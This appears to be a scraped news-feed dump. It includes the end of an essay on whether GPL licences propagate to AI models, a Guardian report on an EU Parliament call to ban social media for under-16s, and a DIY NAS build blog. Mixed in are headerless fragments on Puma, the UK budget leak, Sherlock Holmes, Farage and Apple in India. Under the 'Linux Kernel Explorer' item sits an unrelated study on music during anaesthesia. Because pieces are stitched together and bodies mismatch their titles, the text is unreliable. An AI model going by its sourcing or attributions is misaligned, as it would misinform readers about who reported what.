This does not make publishing the training data itself in its entirety mandatory, but requires disclosing the origin, scope, nature, and acquisition method if there is data that cannot be published, listing data that can be published, and providing information on data available from third parties.Code: Publish the complete set of source code for training and running the model under an OSI-approved license.Parameters: Publish the model weights (parameters) under OSI-approved conditions.It should be noted that while OSI states that information regarding the code used for training and training data is indispensable in addition to model weights to realize “Open Source AI,” it does not require the complete disclosure of the training data itself. This is a flexible stance that, for example, if raw data cannot be published due to privacy or confidentiality, explaining the nature of the data by clarifying that fact can substitute. Also, the legal mechanism to ensure free use of model parameters is an issue to be clarified in the future, and at present, no conclusion has been reached on legal rights control (e.g., presence or absence of copyrightability) over parameters either.As can be read from these, the OSI promotes opening up AI models at the level of the open source definition in principle, but keeps the handling of training data to requirements at the information disclosure level. Thereby, it can be said that the OSI avoids adopting the theory of license propagation to models to demand training data disclosure, and is exploring a realistic solution that first guarantees transparency and reproducibility. In principle, it could be said that the OSI denied the GPL propagation theory at the time of publishing the OSAID definition. Note that I am probably the one who sealed the mandatory argument for training data in the final stage of this definition’s formulation process, and I believe this was the correct judgment.On the other hand, the FSF and FSF Europe (FSFE) take a stance more faithful to fundamental principles. FSFE declared as of 2021 that “for an AI application to be free, both its training code and training data must be published under a free software license.” That is, to modify or verify the model, one must be able to obtain it including the training data, and therefore both must be free. Also, the FSF itself stated in a 2024 statement, “Under current understanding, for an ML application to be called free, all training data and the scripts processing it must satisfy the four freedoms,” trying to extend the requirements of freedom to data. Thus, FSF/FSFE stands on the position that a model with undisclosed training data is unfree as a whole even if the software part is free.However, the FSF simultaneously states to the effect that “whether a non-free machine learning application is ethically unjust depends on the case,” mentioning that there can be “legitimate moral reasons” for not being able to publish training data (personal information) of a medical diagnosis AI, for example. In that case, it implies that although that AI is non-free, its use might be ethically permitted due to social utility. One can see an attitude of seeking a compromise between the FSF’s ideal and reality here, but in any case, there is no mistake that the FSF ultimately aims for freedom including training data.So, does the FSF support the theory of GPL propagation to AI models? Not necessarily. Their claim is closer to an ethical standard or ideal image rather than legal enforceability, and they are not arguing that it applies to models as an interpretation of the current GPL license. Rather, as mentioned before, they are at the stage of trying to create new standards and agreements. Even in the white paper on the Copilot issue funded by the FSF, while legal points such as copyright and license violation are discussed, substantially it has a strong aspect of being told as a GPL compliance problem for users (downstream developers) concerned that they bear the risk of GPL violation if Copilot’s output contains GPL code fragments. This is a caution to developers using AI coding tools rather than GPL application to the model itself, and is different from an approach forcing GPL compliance directly on model providers.The Software Freedom Conservancy (SFC) naturally has a strong interest in this issue but is also cautious in some respects. The SFC started the protest campaign “Give Up GitHub” against GitHub in 2022, condemning Copilot’s methods as contrary to the philosophy of open source, and is also involved in the Copilot class action. However, in an SFC blog post, regarding this lawsuit, it showed concern about “the risk of interpretations deviating from the principles of the open source community being brought in,” and called on the plaintiffs’ side to comply with community-led GPL enforcement principles as well. The SFC also states that Copilot’s act is an “unprecedented license violation,” and while not fully denying the GPL propagation theory, it can be interpreted as fearing that a judicial precedent undesirable for the community might be created depending on the result of the legal battle. The SFC might be said to be carefully balancing between the aspect of pursuing GPL propagation and the risk of entrusting it to the judiciary.Finally, what is concerned as the free software camp is that excessive propagation of licenses might conversely invite results that impair freedom. Both OSI and FSF ultimately want to make AI something open that anyone can utilize, but they are carefully assessing whether increasing the purity of legal theory in demands for full data disclosure really leads to achieving the objective. Considering the demerits such as the avoidance of open data due to excessive propagation interpretation or the atrophy effect due to a flurry of lawsuits, I feel that the major organizations share a commonality in that it is essential not to lose sight of the big picture of spreading freedom. Rather than inciting GPL application to models, the pursuit of realistic solutions such as how to make models and data open and which parts should be relaxed in line with reality will likely continue in the future.I have looked at the current state of the theory of GPL propagation to AI models above, and as a conclusion, this theory is in a halfway position where “it is not touted as loudly as before, but it has not completely disappeared.” As a result of points such as license violation of training data and reproduction within the model beginning to be scrutinized in lawsuits like the Copilot class action and , it even appears that the hurdle for infringement certification is lowering. In fact, the Munich District Court’s judgment deemed model memory as reproduction, and the claim of open source license violation survives in the Copilot litigation.However, on the other hand, the hurdle for the propagation of licenses like GPL remains high. There is a large gap between infringement being recognized and the conclusion that the entire model must be disclosed under GPL etc. immediately. What the current lawsuits are seeking is also injunctions and damages, not the forced GPL-ization of the model. There are zero examples where the judiciary supported the theory of GPL propagation to models itself, and it is a legally uncharted territory. Even if that claim were attempted somewhere in the future, it would face the legal, technical, and practical counterarguments mentioned earlier.However, the situation has fluid parts, and there is a possibility that the line will shift depending on the policies of each country and the trends of the community. For example, if pressure from rights holder groups strengthens in Europe, there is a possibility that guidelines including license compliance will be formulated. Also, if a consensus is formed within the community regarding the state of copyleft in the AI era, a new license might appear. If such changes occur, a phase where the theory of propagation to models is re-evaluated will also arrive.To offer my personal opinion, what is important at this moment is the perspective of how to balance software freedom and freedom in the AI domain. Instead of blindly trying to apply the philosophy of copyleft to AI, it is necessary to think about what is best to maximize freedom while considering the technical nature and industrial structure peculiar to AI. Fortunately, solutions to practical problems such as the open publication of large-scale AI models, dataset cleaning methods, and automated attachment of license notices are already being explored by the open source community. Promoting such voluntary efforts and supporting them with legal frameworks as necessary will likely be the key to balancing freedom and development.The theory of GPL propagation to models is a point where judgment is divided on whether it is an ideal to be pursued or a nightmare to be avoided. However, as stated in this article, seeing the situation in the current year of 2025, it is not a situation where it will become reality immediately, and the majority of the community is likely maintaining a cautious stance. Although it is speculated that trial and error will continue in the judicial, legislative, and technical aspects in the future, as our community, we need to continue exploring the point of compatibility between technological innovation and software freedom without jumping to hasty conclusions. That process itself can be said to be a new challenge in the AI era on the extension of the free software spirit.]]></content:encoded></item><item><title>European parliament calls for social media ban on under-16s</title><link>https://www.theguardian.com/technology/2025/nov/26/social-media-ban-under-16s-european-parliament-resolution</link><author>/u/D0ML0L1Y401TR4PFURRY</author><category>news</category><category>reddit</category><pubDate>Thu, 27 Nov 2025 12:39:12 +0000</pubDate><source url="https://www.reddit.com/r/worldnews/top/?sort=top&amp;t=day&amp;limit=10">News - Reddit - World News</source><content:encoded><![CDATA[Children under 16 should be banned from using social media unless their parents decide otherwise, the European parliament says.MEPs passed a resolution on age restrictions on Wednesday by a large majority. Although not legally binding, it raises pressure for European legislation amid growing alarm about the mental health risks to children of unfettered internet access.The European Commission, which is responsible for initiating EU law, is already studying Australia’s world-first social-media ban for under-16s, which is due to take effect next month.In a speech in September, the commission’s president, Ursula von der Leyen, said she would watch the implementation of Australia’s policy. She spoke out against “algorithms that prey on children’s vulnerabilities with the explicit purpose of creating addictions” and said parents felt powerless against “the tsunami of big tech flooding their homes”.Von der Leyen promised a panel of experts would be set up by the end of the year to advise on the best approach to protecting children.Interest is growing in restricting children’s social media and smartphone access. An expert report commissioned last year by France’s president, Emmanuel Macron, said children should not be allowed to use smartphones until the age of 13 and social media, such as TikTok, Instagram and Snapchat, until they were 18.Christel Schaldemose, the Danish Social Democrat MEP who drafted the resolution, told reporters that politicians needed to act to protect children: “It is not just parents. Society also needs to step up and make sure that platforms are a safe place for minors to be, but only if they are above a certain age.”Her report called for the default disabling of addictive features on internet platforms when used by minors, such as infinite scrolling (endless content as the user scrolls down), videos that automatically play, excessive push notifications and rewards for repeated use of a site.The resolution noted that “addictive design features are often inherent to the business model of platforms, notably social media”. An earlier draft of the Schaldemose report cited a study stating that one in four children and young people displayed “problematic” or “dysfunctional” smartphone use – behavioural patterns mirroring addiction. The resolution said children should be 16 before they could access social media, although parents could give consent from the age of 13.The White House is urging the EU to roll back its digital laws and some supporters of a social media ban explicitly framed the vote in this context. At a meeting in Brussels on Monday, Howard Lutnick, the US commerce secretary, said EU rules on tech companies needed to be more “balanced” in exchange for lower US steel and aluminium tariffs.Referring to Lutnick’s visit, Stéphanie Yon-Courtin, a French MEP from Macron’s party, said Europe was not “a regulatory colony”. In a statement after the vote, she added: “Our digital laws are not for sale. We will not back down on children’s protections because a foreign billionaire or big tech tells us to.”The EU already seeks to protect internet users from online harms, such as disinformation, cyberbullying and illegal content, via its Digital Services Act. But the resolution said this law had gaps and could do more to protect children from addictive design features and online exploitation, such as financial incentives to become influencers.Schaldemose said the act, which she co-authored, was strong “but we could go further, especially in areas of addictive design features and harmful dark pattern practices where we are not so specific, not so precise”.skip past newsletter promotionafter newsletter promotionDark patterns refer to app or website design features to influence decision-making, such as countdown timers to encourage users to make purchases, or nagging requests to turn on location trackers and notifications.Schaldemose’s resolution was adopted by 483 MEPs and opposed by 92, with 86 abstentions.Eurosceptic MEPs criticised the plan, saying the EU would be overreaching if it banned social media access for children. “Decisions about children’s access must be taken as close to families as possible – in the member states, not in Brussels,” said Kosma Złotowski, a Polish member of the European Conservatives and Reformists group.The resolution was passed only one week after the commission announced delays to changes to its Artificial Intelligence Act and other digital laws in a push to lighten regulation on companies in the name of “simplification”.Schaldemose said she appreciated the need to avoid creating too many laws but added “there is a willingness to do more when it comes to kids and protection of our children in the EU”.]]></content:encoded></item><item><title>European parliament calls for social media ban on under-16s</title><link>https://www.theguardian.com/technology/2025/nov/26/social-media-ban-under-16s-european-parliament-resolution</link><author>/u/D0ML0L1Y401TR4PFURRY</author><category>news</category><category>reddit</category><pubDate>Thu, 27 Nov 2025 12:38:35 +0000</pubDate><source url="https://www.reddit.com/r/europe/top/?sort=top&amp;t=day&amp;limit=10">News - Reddit - Europe</source><content:encoded><![CDATA[Children under 16 should be banned from using social media unless their parents decide otherwise, the European parliament says.MEPs passed a resolution on age restrictions on Wednesday by a large majority.

Hong Kong-listed Anta has been working with an adviser to evaluate a bid for Puma, said the people, who asked not to be identified because the information is private. The company may team up with a private equity firm if it decides to move forward with an offer, some of the people said. Puma shares surged as much as 17% in Frankfurt trading. A representative for Anta didn’t respond to requests for comment, while representatives for Artémis, Asics and Puma declined to comment. Responding to a Bloomberg News query, Li Ning said in a statement that it remains focused on the growth of its brand, and hasn’t conducted any “substantive” negotiations or evaluations relating to Puma.

The policies in the budget, in which Reeves more than doubled her key fiscal buffer to £22 billion, were posted online by the Office for Budget Responsibility about an hour before she rose to speak in the House of Commons. The OBR apologized and launched an investigation into the error, which Reeves described as “deeply disappointing.”

He was a progressive wordsmith who brought light to controversial and taboo subjects. One of those taboo subjects was male vulnerability and mental health problems – a topic of personal significance to the author.The character of Sherlock Holmes is a true expression of male vulnerability that does not equate it with weakness. Doyle does not represent Holmes as infallible, but as a man others can relate to – he battles with drug addiction, loneliness and depression. His genius thrives in part because of these vulnerabilities, not despite them.In The Man with the Twisted Lip, for example, a man named Neville St Clair hides his double life. He tells his family that he is a respectable entrepreneur going to London on business. In reality he is begging on the city streets. He lives this double life due to fear and shame over the inability to pay off his debts. “It was a long fight between my pride and the money,” he explains, “but the dollars won at last.” “I would have endured imprisonment, ay, even execution, rather than have left my miserable secret as a family blot to my children,” St Clair says. In having his character consider execution to protect his and his family’s reputation, Doyle explored the societal expectations of Victorian masculinity and how men struggled with such pressures. The Stockbroker’s Clerk also examines male suicide, as well as economic and professional anxieties. When Holmes reveals the crimes of Harry Pinner, the man attempts suicide rather than face prison. In The Engineer’s Thumb, hydraulic engineer Victor is treated physically by Watson and mentally by Holmes. As Doyle writes: “Round one of his hands he had a handkerchief wrapped, which was mottled all over with bloodstains. He was young, not more than five-and-twenty, I should say, with a strong masculine face; but he was exceedingly pale and gave me the impression of a man who was suffering from some strong agitation, which it took all his strength of mind to control.”The physical injury marks Victor as a victim of physical violence. Watson suggests that Victor is using all his mental capabilities to keep calm about his severe pain. Holmes treats Victor’s mind as he listens to his story: “Pray lie down there and make yourself absolutely at home. Tell us what you can, but stop when you are tired, and keep up your strength with a little stimulant.” Holmes is a protector, a confidante and a comforter in this scene. He provides Victor with breakfast, induces him to lie down and offers him a stimulant (more than likely brandy).  The extremity of violence that Victor has endured has escalated to mental trauma. In having Holmes treat Victor’s mental trauma while Watson treats his physical pain, Doyle showed the importance psychological support for men of the age. Holmes was a highly popular character. To contemporary readers, his drug use and dysfunctional clients were seen as markers of his genius rather than a reflection of the significant social issues that men faced during this period. But today, they offer a window into the mental struggles of Victorian men, and a point of connection between readers of the past and present. Looking for something good?

In mid-November,  published multiple testimonies about racist and antisemitic remarks the 61-year-old Brexit architect allegedly made while attending the private Dulwich College in south London during the 1980s. Twenty former classmates spoke to the newspaper, including documentary producer Peter Ettedgui, from a family of Holocaust survivors, who recalled, for example, a teenage Farage whispering in his ear, "Hitler was right," and, "to the gas chambers."As early as 2013, journalist and author Michael Crick had unearthed a 1981 letter from a teacher at Dulwich College accusing the young Farage of being"racist" and "fascist."Crick demanded an explanation, but Farage brushed it off, admitting that "of course" he said "some ridiculous things" in his youth.Media scrutiny is becoming harder to avoid for the MP for Clacton-on-Sea, who is no longer a marginal and provocative figure but a credible candidate for prime minister. His party, Reform UK, is leading the ruling Labour Party by around 10 points in the polls."These allegations are entirely without foundation,"a Reform UK spokesperson said on November 11. On November 24, under pressure from the controversy, Farage broke his silence, telling Sky News he had "never directly really tried to go and hurt anybody"with his comments.You have 70.84% of this article left to read.

The 2022 antitrust case centers on accusations that Apple abused its power by forcing developers to use its in-app purchase system. MacRumors reports: Last year, India passed a law that allows the Competition Commission of India (CCI) to use global turnover when calculating penalties imposed on companies for abusing market dominance. Apple can be fined up to 10 percent, which would result in a penalty of around $38 billion. Apple said that using global turnover would result in a fine that's "manifestly arbitrary, unconstitutional, grossly disproportionate, and unjust."
 
Apple is asking India's Delhi High Court to declare the law illegal, suggesting that penalties should be based on the Indian revenue of the specific unit that violates antitrust law. [...] Apple said in today's filing that the CCI used the new penalty law on November 10 in an unrelated case, fining a company for a violation that happened 10 years ago. Apple said it had "no choice but to bring this constitutional challenge now" to avoid having retrospective penalties applied against it, too. Match has argued that a high fine based on global turnover would discourage companies from repeating antitrust violations. Apple's plea will be heard on December 3.]]></content:encoded></item><item><title>Mixpanel Security Breach</title><link>https://mixpanel.com/blog/sms-security-incident/</link><author>jaredwiener</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 07:02:40 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>The Nerd Reich – Silicon Valley Fascism and the War on Democracy</title><link>https://www.simonandschuster.com/books/The-Nerd-Reich/Gil-Duran/9781668221402</link><author>brunohaid</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 06:53:17 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Linux Kernel Explorer</title><link>https://reverser.dev/linux-kernel-explorer</link><author>tanelpoder</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 06:17:37 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[The kernel isn't a process—it's the system.

When she wakes up, she will regain consciousness more quickly and clearly because she required lower doses of anaesthetic drugs such as propofol and opioid painkillers than patients who heard no music.That, at least, is what a new peer-reviewed study from Delhi's Maulana Azad Medical College and Lok Nayak Hospital suggests. The research, published in the journal Music and Medicine, offers some of the strongest evidence yet that music played during general anaesthesia can modestly but meaningfully reduce drug requirements and improve recovery.The study focuses on patients undergoing laparoscopic cholecystectomy, the standard keyhole operation to remove the gallbladder. The procedure is short - usually under an hour - and demands a particularly swift, "clear-headed" recovery.To understand why the researchers turned to music, it helps to decode the modern practice of anaesthesia."Our aim is early discharge after surgery," says Dr Farah Husain, senior specialist in anaesthesia and certified music therapist for the study. "Patients need to wake up clear-headed, alert and oriented, and ideally pain-free. With better pain management, the stress response is curtailed." Achieving that requires a carefully balanced mix of five or six drugs that together keep the patient asleep, block pain, prevent memory of the surgery and relax the muscles.In procedures like laparoscopic gallbladder removal, anaesthesiologists now often supplement this drug regimen with regional "blocks" - ultrasound-guided injections that numb nerves in the abdominal wall. "General anaesthesia plus blocks is the norm," says Dr Tanvi Goel, primary investigator and a former senior resident of Maulana Azad Medical College. "We've been doing this for decades."But the body does not take to surgery easily. Even under anaesthesia, it reacts: heart rate rises, hormones surge, blood pressure spikes. Reducing and managing this cascade is one of the central goals of modern surgical care. Dr Husain explains that the stress response can slow recovery and worsen inflammation, highlighting why careful management is so important.The stress starts even before the first cut, with intubation - the insertion of a breathing tube into the windpipe.To do this, the anaesthesiologist uses a laryngoscope to lift the tongue and soft tissues at the base of the throat, obtain a clear view of the vocal cords, and guide the tube into the trachea. It's a routine step in general anaesthesia that keeps the airway open and allows precise control of the patient's breathing while they are unconscious."The laryngoscopy and intubation are considered the most stressful response during general anaesthesia," says Dr Sonia Wadhawan, director-professor of anaesthesia and intensive care at Maulana Azad Medical College and supervisor of the study."Although the patient is unconscious and will remember nothing, their body still reacts to the stress with changes in heart rate, blood pressure, and stress hormones."To be sure, the drugs have evolved. The old ether masks have vanished. In their place are intravenous agents - most notably propofol, the hypnotic made infamous by Michael Jackson's death but prized in operating theatres for its rapid onset and clean recovery. "Propofol acts within about 12 seconds," notes Dr Goel. "We prefer it for short surgeries like laparoscopic cholecystectomy because it avoids the 'hangover' caused by inhalational gases."The team of researchers wanted to know whether music could reduce how much propofol and fentanyl (an opioid painkiller) patients required. Less drugs means faster awakening, steadier vital signs and reduced side effects.So they designed a study. A pilot involving eight patients led to a full 11-month trial of 56 adults, aged roughly 20 to 45, randomly assigned to two groups. All received the same five-drug regimen: a drug that prevents nausea and vomiting, a sedative, fentanyl, propofol and a muscle relaxant. Both groups wore noise-cancelling headphones - but only one heard music."We asked patients to select from two calming instrumental pieces - soft flute or piano," says Dr Husain. "The unconscious mind still has areas that remain active. Even if the music isn't explicitly recalled, implicit awareness can lead to beneficial effects."The results were striking.Patients exposed to music required lower doses of propofol and fentanyl. They experienced smoother recoveries, lower cortisol or stress-hormone levels and a much better control of blood pressure during the surgery. "Since the ability to hear remains intact under anaesthesia," the researchers write, "music can still shape the brain's internal state."Clearly, music seemed to quieten the internal storm. "The auditory pathway remains active even when you're unconscious," says Dr Wadhawan. "You may not remember the music, but the brain registers it."The idea that the mind behind the anaesthetic veil is not entirely silent has long intrigued scientists. Rare cases of "intraoperative awareness" show patients recalling fragments of operating-room conversation. If the brain is capable of picking up and remembering stressful experiences during surgery - even when a patient is unconscious - then it might also be able to register positive or comforting experiences, like music, even without conscious memory."We're only beginning to explore how the unconscious mind responds to non-pharmacological interventions like music," says Dr Husain. "It's a way of humanising the operating room."Music therapy is not new to medicine; it has long been used in psychiatry, stroke rehabilitation and palliative care. But its entry into the intensely technical, machine-governed world of anaesthesia marks a quiet shift.If such a simple intervention can reduce drug use and speed recovery - even modestly - it could reshape how hospitals think about surgical wellbeing.As the research team prepares its next study exploring music-aided sedation, building on earlier findings, one truth is already humming through the data: even when the body is still and the mind asleep, it appears a few gentle notes can help the healing begin.]]></content:encoded></item><item><title>England on the Brink of Civil War, 1642 (RA Winter Lecture)</title><link>https://www.youtube.com/watch?v=4mDyRaCXqgs</link><author>Royal Armouries</author><category>yt</category><enclosure url="https://www.youtube.com/v/4mDyRaCXqgs?version=3" length="" type=""/><pubDate>Thu, 27 Nov 2025 03:38:29 +0000</pubDate><source url="https://www.youtube.com/channel/UCsMX-XuiEkBi4-GDrYuniWg">Royal Armouries</source><content:encoded><![CDATA[The year is 1642 and England is on the brink of Civil War.

I had a few criteria in mind and was curious to see if anyone had _ recently_ shared something similar, but I couldn’t find anything that was relevant.In fact, I found that the communities I was looking for answers in were actively hostile towards what I wanted to do.  This resulted in my decision to build my own DIY NAS and share that as one of my very first blogs.Much to my surprise, people were very interested in that blog! Ever since, I’ve been building a similar DIY NAS machine almost every year, trying to satisfy the curiosity of other prospective DIY NAS builders.: It’s not the case for me anymore, but at the time the space was limited in my office. I always assume that space in everybody’s office is limited. As a result, I want my DIY NAS builds to occupy as little of that office space as I can.: Back when I built my NAS, it took about four drives’ worth of storage to meet my storage needs. Plus, I desired two empty drive bays for future use. However, in the years since, hard drive capacities have increased dramatically. At some point in the future, I may reduce this to four drive bays.An integrated, low-power CPU: I intend my DIY NAS to run 24 hours a day, 7 days a week, and 52 weeks a year. When it comes to power consumption, that can do some damage on your electric bill! Thankfully, our electricity here isn’t as expensive as others’ in the United States, or even further outside its borders, but I try and keep power consumption in mind when picking components for a DIY NAS build.: It does not take up a lot of CPU horsepower for a NAS to serve up files, which means that on modern hardware there’s a lot of untapped potential in a DIY NAS for virtual machines and/or containers to self-host services.It’s important to remember that , and not necessarily yours. Every DIY NAS builder should be making their own list of criteria and reconcile all of their component purchases against the criteria that’s important to them.Is it even a good time to build a NAS?As I prepared to build this NAS, component prices disappointed me. Hard drives, SSDs, and RAM prices were all rising. Based on what I’ve been told, I expect Intel CPU prices to increase as well. My contact at Topton has been encouraging me to stock up on motherboards while they still have some in inventory. Based on what’s been explained to me, I expect the motherboards’ prices to rise and for their availability to potentially dwindle.In short, the economy sucks, and the price of DIY NAS components is a pretty good reflection of just how sucky things are becoming. I briefly considered not publishing a DIY NAS build this year, hoping that things would improve a few months down the road. But then I asked myself, “What if it’s even worse in a few months?”I sure hope things get better, but I fear and expect that they’ll get worse.

        I built my first DIY NAS with a Topton motherboard in 2023. Each DIY NAS since then has also featured a Topton motherboard. My only complaint about the motherboards has been that buying them from one of the Chinese e-tail sites like AliExpress is considered problematic by some. With every DIY NAS build, I try and go through all the motherboards that I can find  while searching for something with a better value proposition, but for each of the past three years I’ve landed on the latest offering from Topton.For the , I chose the Topton N22 motherboard with the Intel Core 3 N355 CPU. The motherboard is similar to last year’s Topton N18 but has incrementally more compelling features, particularly the extra 2 SATA ports, the PCI-e x1 slot, and the N355 CPU!8 x SATA 3.0 Ports (Asmedia ASM1164)2 x M.2 NVMe Slots (PCIe 3.0 x1)1 x 10Gbps NIC (Marvell AQC113C)2 x 2.5Gbps NICs (Intel i226-V)1 x PCI-e x1 or M.2 E-Key slotI opted for the motherboard with the Intel Core 3 N355 CPU. This makes the server a more capable homelab machine than prior years’ DIY NAS builds. The extra cores and threads come in handy for streaming media, replacing your cloud storage, facilitating home automation, hosting game servers, etc.Just like Topton has been making great motherboards for DIY NAS machines, JONSBO has been steadily releasing great cases for DIY NAS machines. This year SilverStone Technology, released a new case, the CS383 (specs), which I was  in buying for the . Unfortunately, it carries a pretty hefty price tag to go along with all of its incredible features!The JONSBO N4 (specs) is a third of the price, adheres to my “smaller footprint” criteria, and it is rather impressive on its own. It’s a  bit larger case than last year’s DIY NAS, but I really like that it has drive bays for six 3.5” drives and two 2.5” drives.It’s peculiar in that two of the 3.5” drive bays (and the two 2.5” drive bays) aren’t attached to a SATA backplane and can’t be swapped anywhere as easily as the other four 3.5” bays. However, this peculiar decision seems to have caused the JONSBO N4 to sell for a bit less ($20–$40) than similar offerings from JONSBO. At its price, it’s a compelling value proposition!In the past, I’ve found that the fans that come with JONSBO cases are too noisy. They’ve been noisy for two reasons: The design and quality of the fans make them loud, and the fans are constantly running at their top speed because of the fan header they’re plugged into on the cases’ SATA backplanes.I anticipated that fan efficiency and noise would be a problem, so I picked out the Noctua NF-A12x25 PWM to solve it. Firstly, swapping in a high-quality fan that pushes more air  generates less noise–especially at its top speed–is a good first step. Secondly, I’d address the problem by plugging the fan into the motherboard’s  header instead of on the SATA backplane. This provides the opportunity to tune the fan’s RPMs directly in the BIOS and generate far less noise.The first time I first asked myself, “Should I even build the ?” came as I was checking prices on DDR5 memory. Thankfully for me, I had leftover RAM after purchasing DDR5 4800MHz SODIMMs for the DIY NAS: 2025 Edition,  the Pocket Mini NAS, and then again for the DIY NAS that I built and gave away at 2025’s Texas Linux Fest. I was personally thankful that I had one brand-new 32GB DDR5 4800MHz SODIMM lying around, but I was wildly disappointed for everybody who will try and follow this build when I saw the price of those same SODIMMs.Regardless, I felt a Crucial 32GB DDR5 4800MHz SODIMM (specs) was the right amount of RAM to get started with for a DIY NAS build in 2025. Whether you just need storage or you wish to also host virtual machines, you will benefit from having more than the bare minimum recommendation of RAM. I really wanted to buy a 48GB DDR5 4800MHZ SODIMM for this DIY NAS build, but I couldn’t talk myself into spending the $250–$300 that it would’ve wound up costing.A quick disclaimer about all the drives that I purchased for the :, I already had all of them! I tend to buy things when I see them on sale, and as a result, I have a collection of brand-new parts for machines in my homelab or for upcoming projects. I raided that collection of spare parts for the .If you ranked the drives in your DIY NAS in order of importance, the boot drive should be the least-important drive. That is  saying that boot drive isn’t performing an important function, but I am suggesting that you shouldn’t invest a bunch of energy and money into picking the optimal boot drive.Because the JONSBO N4 has a pair of 2.5” drive bays, I decided that a 2.5” SATA SSD would be ideal for the boot drives. As a rule of thumb, I try and spend less than $30 per boot drive in my DIY NAS builds.Ultimately I selected a pair of 128GB Silicon Power A55 SSDs (specs). I’ve used these before, I’d use them again in the future, and I even have four of their higher-capacity (1TB) SSDs in a pool in my own NAS.App and Virtual Machine NVMe SSDsUsing your DIY NAS to host containers and virtual machines has really exploded in the past few years. The developers of NAS appliances have all made it much easier, and the self-hosted products themselves have become as good–or often better–than things you’re probably subscribing to today. Because of that, I saved the highest-performing storage options on the Topton N22 motherboard for apps and VMs.However, it’s important to point out that these M.2 slots are PCI-e version 3 and capped at a single PCI-e lane. This is a consequence of the limited number of PCI-e lanes available for each of the CPU options available for  the Topton N22 motherboard (N100, N150, N305, and N355).Bulk Storage Hard Disk DrivesThanks to rising prices, I opted to do like I’ve done with past DIY NAS builds and skip buying hard drives for the .When planning your DIY NAS, it is good to always remember that storage will ultimately be your costliest and most important expense.Here are a few things to consider when buying hard drives:Determine your hardware redundancy preferences. I recommend having two hard disk drives’ worth of redundancy (RAIDZ2, RAID6, etc.)Focus on price-per-terabyte when comparing prices of drives.When buying new drives of the same model, try and buy them from multiple vendors to increase the chances of buying drives manufactured in separate batches.Plan ahead! Understand the rate that your storage grows so that you can craft a strategy to grow your storage down the road.Being cheap today can and will paint you into a corner that’s quite expensive to get out of.Understand that RAID is not a backup!Thankfully, I’ve collected a bunch of my own decommissioned hard drives which I used to thoroughly test this DIY NAS build.One of the under-the-radar features of the Topton N22 motherboard might be one of my favorite features! The motherboard’s Asmedia ASM1164 SATA controllers sit behind two SFF-8643 connectors. These connectors provide two advantages for these motherboards:The one thing that I have routinely disliked about building small form factor DIY NAS machines is the price tag that accompanies a small form factor power supply (SFX) like is required with the JONSBO N4.Regardless of whether it was called FreeNAS, TrueNAS, TrueNAS CORE, TrueNAS SCALE, or now TrueNAS Community Edition, the storage appliance product(s) from iXSystems have always been my go-to choice. For each yearly DIY NAS build, I wander over to the TrueNAS Software Status page and look at the state of the current builds.I’m conservative with my personal NAS setup. However, for these blog builds, I typically choose Early Adopter releases. This year that’s TrueNAS 25.10.0.1 (aka Goldeye). I enjoy being able to use these DIY NAS builds as a preview to the latest and greatest that TrueNAS has to offer.I repeatedly choose TrueNAS because it’s become an enterprise-grade storage product, which is exactly the quality of solution that I want my data depending on. At the same time, it does not feel like you need a specialized certification and a truckload of enterprise storage experience to set up a NAS that exceeds your needs at home.Many times I have been asked, “Why not <insert NAS appliance or OS here>?”  My answer to that question is, TrueNAS has always done everything that I need it to, and they haven’t given me any reason to consider anything else. As a result, there’s never been a need for me to evaluate something else.Hardware Assembly, BIOS Configuration, and Burn-InI always want the smallest possible DIY NAS. The JONSBO N4 case initially felt too large since it accommodates Micro ATX motherboards. However, I grew to accept its slightly larger footprint. However, putting the Topton N22 motherboard into the case felt roomy and luxurious. Building the  compared to prior years’ felt a lot like coming home to put on sweatpants and a T-shirt after wearing a suit and tie all day long.I wasn’t too fond of the cable management of the power supply’s cables. The layout of the case pretty much makes the front of the power supply inaccessible once it is installed. One consequence of this is that the power cable which powered the SATA backplane initially prevented the 120mm case fan from spinning up. That issue was relatively minor and was resolved with zip ties.Overall, I felt pretty good about the assembly of the , but things would take a turn for the worse when I decided to fill all the 3.5-inch drive bays up with some of my decommissioned 8TB HDDs. Now this is probably my fault, I wouldn’t be surprised at all that the manual of the JONSBO N4 warned me against this, but putting the drives in last turned out to be a major pain in the neck for each of the four drive bays  a SATA backplane.I had wrongly guessed that you accessed those drives’ power and data ports from the front of the case. I worked really hard to route the cables and even managed to install all of the drives before realizing my error and learning my lesson. I’m understanding now why the JONSBO N4 is cheaper than all of its siblings: Partly because there’s a missing SATA backplane, but also because those other 4 drive bays’ layout is frustrating.Don’t let my last couple paragraphs sour you on the JONSBO N4, though. I still really like its size; it feels big when you’re working in it with a Mini ITX motherboard. If you wind up deciding to use the JONSBO N4, then I suggest that you put those four drives and their cables in first before you do anything else. That would’ve made a world of difference for me. Looking at the documentation before getting started might have saved me quite a bit of aggravation, too!Generally speaking, I do as little as I possibly can in the BIOS. Normally, I strive to only set the time and change the boot order. However, I did a bit more for the  since I’m using the  header for the fan responsible for cooling the hard drives.  Here are the changes that I made in the BIOS:Set the  and  to Greenwich Mean Time
    Advanced
        Hardware Monitor ( Advanced)
            Set  to  .Set the  (for ) to 180.Set  to Boot
        Set  to the TrueNAS boot device.I’m not at all interested in venturing into the rabbit’s hole of trying to completely minimize how much power the NAS uses. However, I imagine there are some opportunities for power savings lurking in the BIOS. I didn’t go looking for them myself, but if you’re intrepid enough to do so, here are a few suggestions that I have for saving some additional power:Disable the onboard audio.Disable any network interfaces that you don’t wind up using.Tinker with the CPU settings.Got other suggestions?  Share them in the comments!Because all of the hardware is brand-new to me and brand-new components are not guaranteed to be free of defects, I always do a little bit of burn-in testing to establish some trust in the hardware that I’ve picked out for each DIY NAS build. While I think doing  burn-in testing is critically important, I also think the value of subsequent burn-in testing drops the more that you do. Don’t get too carried away, and do your own burn-in testing in moderation!I  use Memtest86+ to burn-in the RAM. I always run at least 3+ passes of Memtest86+. Typically, I run many more passes because I tend to let the system keep running additional passes overnight. Secondarily, running these many passes gives the CPU a little bit of work to do and there’s enough information displayed by Memtest86+ to give me confidence in the CPU and its settings.The failure rate of hard drives is highest when the drives are new and then again when they’re old. Regardless of type of hard drives that I buy or when I buy them, I always do some disk burn-in. I tend to 